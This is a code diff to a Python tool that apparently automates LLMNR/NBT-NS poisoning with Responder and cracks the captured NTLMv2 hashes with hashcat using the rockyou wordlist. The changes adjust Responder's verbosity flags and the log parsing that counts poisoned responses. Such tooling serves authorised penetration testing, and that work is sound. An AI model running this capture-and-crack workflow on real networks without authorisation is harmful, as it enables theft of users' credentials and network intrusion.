@@ -22,7 +22,7 @@ from typing import Dict, List, Optional, Set, Tuple
 
 HOME_CONFIG_PATH = Path.home() / ".netloop_config.json"
 LOCAL_CONFIG_PATH = Path.cwd() / ".netloop_config.json"
-DEFAULT_RESPONDER_FLAGS = "-wv"
+DEFAULT_RESPONDER_FLAGS = "-w"
 DEFAULT_HASHCAT_FLAGS = "-m 5600"
 DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
 HASH_FILE_GLOB = "*NTLMv2*.txt"
@@ -97,6 +97,13 @@ def verbose_print(enabled: bool, line: str) -> None:
 
 def canonical_user(user: str) -> str:
     return user.strip().lower()
+
+
+def normalize_responder_flags(flags: str, disable_responder_verbose: bool = False) -> str:
+    parts = shlex.split(flags)
+    if disable_responder_verbose:
+        parts = [p for p in parts if p not in ("-v", "--verbose")]
+    return " ".join(parts).strip()
 
 
 def sanitize_for_filename(value: str) -> str:
@@ -265,13 +272,9 @@ def ingest_hash(stats: Stats, user: str, full_hash: str) -> None:
 def parse_responder_stream_line(line: str, stats: Stats) -> None:
     clean_line = strip_ansi(line)
     lower_line = clean_line.lower()
-    if "poison" in lower_line and (
-        "answer sent" in lower_line
-        or "response sent" in lower_line
-        or "[llmnr]" in lower_line
-        or "[mdns]" in lower_line
-        or "[nbt-ns]" in lower_line
-        or "[dns]" in lower_line
+    is_protocol_line = any(tag in lower_line for tag in ("[llmnr]", "[mdns]", "[nbt-ns]", "[dns]"))
+    if ("poison" in lower_line and ("sent" in lower_line or "answer" in lower_line or "response" in lower_line)) or (
+        is_protocol_line and "sent to" in lower_line
     ):
         stats.poisoned_responses += 1
     elif "ntlmv2-ssp client" in lower_line:
@@ -684,11 +687,19 @@ def run_capture_and_crack(
     hashcat_path = shutil.which("hashcat")
     hashcat_missing_warned = False
 
+    responder_flags = normalize_responder_flags(
+        responder_flags,
+        disable_responder_verbose=verbose,
+    )
+    if not responder_flags:
+        responder_flags = DEFAULT_RESPONDER_FLAGS
+
     cmd = [responder_path, "-I", interface] + shlex.split(responder_flags)
     print(c(f"Starting responder: {' '.join(cmd)}", Color.CYAN))
     if verbose:
         print(c("Verbose mode enabled: streaming responder/hashcat output.", Color.YELLOW))
         print(c("Verbose mode display: raw logs + periodic status snapshots.", Color.YELLOW))
+        print(c("Responder -v is disabled in netloop verbose mode.", Color.YELLOW))
 
     interrupted = False
     proc = subprocess.Popen(
